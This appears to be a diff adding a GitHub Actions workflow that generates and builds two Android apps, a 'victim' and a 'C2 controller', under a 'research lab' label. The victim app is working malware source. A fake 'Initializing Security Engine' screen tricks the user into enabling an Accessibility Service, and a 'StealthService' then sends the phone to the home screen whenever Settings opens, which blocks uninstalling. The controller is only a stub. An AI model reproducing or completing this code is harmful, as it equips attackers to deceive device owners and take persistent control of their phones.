@@ -1,0 +1,185 @@
+name: Fix Build and Archive
+on: [push, workflow_dispatch]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup Java
+        uses: actions/setup-java@v4
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+
+      - name: Create Structure
+        run: |
+          mkdir -p victim/src/main/java/com/research/lab/victim
+          mkdir -p victim/src/main/res/xml
+          mkdir -p controller/src/main/java/com/research/lab/controller
+          
+          # קבצי הגדרות
+          echo "include ':victim', ':controller'" > settings.gradle
+          
+          cat <<EOF > build.gradle
+          buildscript {
+              repositories { google(); mavenCentral() }
+              dependencies { classpath 'com.android.tools.build:gradle:8.1.0' }
+          }
+          allprojects {
+              repositories { google(); mavenCentral() }
+          }
+          EOF
+
+          # הגדרות Victim
+          cat <<EOF > victim/build.gradle
+          plugins { id 'com.android.application' }
+          android {
+              namespace 'com.research.lab.victim'
+              compileSdk 33
+              defaultConfig { applicationId "com.research.lab.victim"; minSdk 24; targetSdk 33 }
+          }
+          EOF
+
+          # הגדרות Controller
+          cat <<EOF > controller/build.gradle
+          plugins { id 'com.android.application' }
+          android {
+              namespace 'com.research.lab.controller'
+              compileSdk 33
+              defaultConfig { applicationId "com.research.lab.controller"; minSdk 24; targetSdk 33 }
+          }
+          EOF
+
+      - name: Inject Source Code
+        run: |
+          # הזרקת קוד ה-Victim (שים לב לסימן $ - הוספתי לו Escape כדי ש-bash לא יפרש אותו)
+          cat <<'EOF' > victim/src/main/java/com/research/lab/victim/VictimApp.java
+          package com.research.lab.victim;
+          import android.accessibilityservice.AccessibilityService;
+          import android.accessibilityservice.GestureDescription;
+          import android.accessibilityservice.GestureDescription.StrokeDescription;
+          import android.app.Activity;
+          import android.content.Intent;
+          import android.graphics.Path;
+          import android.os.Bundle;
+          import android.os.Handler;
+          import android.os.Looper;
+          import android.util.Log;
+          import android.view.View;
+          import android.view.accessibility.AccessibilityEvent;
+          import android.widget.Button;
+          import android.widget.LinearLayout;
+          import android.widget.TextView;
+          import java.io.BufferedReader;
+          import java.io.InputStreamReader;
+          import java.net.HttpURLConnection;
+          import java.net.URL;
+          import org.json.JSONObject;
+
+          public class VictimApp {
+              public static class LoadingActivity extends Activity {
+                  @Override
+                  protected void onCreate(Bundle savedInstanceState) {
+                      super.onCreate(savedInstanceState);
+                      LinearLayout layout = new LinearLayout(this);
+                      layout.setOrientation(LinearLayout.VERTICAL);
+                      layout.setGravity(android.view.Gravity.CENTER);
+                      TextView tv = new TextView(this);
+                      tv.setText("Initializing Security Engine...");
+                      layout.addView(tv);
+                      Button btn = new Button(this);
+                      btn.setText("Enable Protection →");
+                      btn.setVisibility(View.GONE);
+                      layout.addView(btn);
+                      setContentView(layout);
+                      new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                          tv.setText("Please enable Accessibility Service");
+                          btn.setVisibility(View.VISIBLE);
+                      }, 2400);
+                      btn.setOnClickListener(v -> startActivity(new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS)));
+                  }
+              }
+
+              public static class StealthService extends AccessibilityService {
+                  @Override
+                  public void onAccessibilityEvent(AccessibilityEvent event) {
+                      if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                          String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
+                          if (pkg.contains("com.android.settings")) performGlobalAction(GLOBAL_ACTION_HOME);
+                      }
+                  }
+                  @Override public void onInterrupt() {}
+              }
+          }
+          EOF
+
+          # הזרקת קוד ה-Controller
+          cat <<'EOF' > controller/src/main/java/com/research/lab/controller/ControllerApp.java
+          package com.research.lab.controller;
+          import android.app.Activity;
+          import android.os.Bundle;
+          import android.view.MotionEvent;
+          import android.view.View;
+          import android.widget.LinearLayout;
+          import android.widget.TextView;
+
+          public class ControllerApp extends Activity {
+              @Override
+              protected void onCreate(Bundle savedInstanceState) {
+                  super.onCreate(savedInstanceState);
+                  LinearLayout layout = new LinearLayout(this);
+                  TextView tv = new TextView(this);
+                  tv.setText("C2 Controller Running");
+                  layout.addView(tv);
+                  setContentView(layout);
+              }
+          }
+          EOF
+
+          # מניפסטים
+          cat <<EOF > victim/src/main/AndroidManifest.xml
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+              <uses-permission android:name="android.permission.INTERNET" />
+              <application>
+                  <activity android:name=".VictimApp\$LoadingActivity" android:exported="true">
+                      <intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter>
+                  </activity>
+                  <service android:name=".VictimApp\$StealthService" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" android:exported="true">
+                      <intent-filter><action android:name="android.accessibilityservice.AccessibilityService" /></intent-filter>
+                      <meta-data android:name="android.accessibilityservice" android:resource="@xml/acc_config" />
+                  </service>
+              </application>
+          </manifest>
+          EOF
+          echo '<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android" android:accessibilityEventTypes="typeAllMask" android:accessibilityFeedbackType="feedbackGeneric" android:accessibilityFlags="flagDefault" android:canPerformGestures="true" android:notificationTimeout="100" />' > victim/src/main/res/xml/acc_config.xml
+
+          cat <<EOF > controller/src/main/AndroidManifest.xml
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+              <uses-permission android:name="android.permission.INTERNET" />
+              <application><activity android:name=".ControllerApp" android:exported="true">
+                  <intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter>
+              </activity></application>
+          </manifest>
+          EOF
+
+      - name: Build with Gradle
+        run: |
+          gradle wrapper --gradle-version 8.1.1
+          chmod +x gradlew
+          ./gradlew assembleDebug --stacktrace
+
+      - name: Verify APK existence
+        run: |
+          echo "Listing all generated APKs:"
+          find . -name "*.apk"
+
+      - name: Upload Artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: research-apks
+          # שימוש בנתיב ישיר יותר כדי למנוע זיפ ריק
+          path: |
+            victim/build/outputs/apk/debug/*.apk
+            controller/build/outputs/apk/debug/*.apk
+          if-no-files-found: error
+
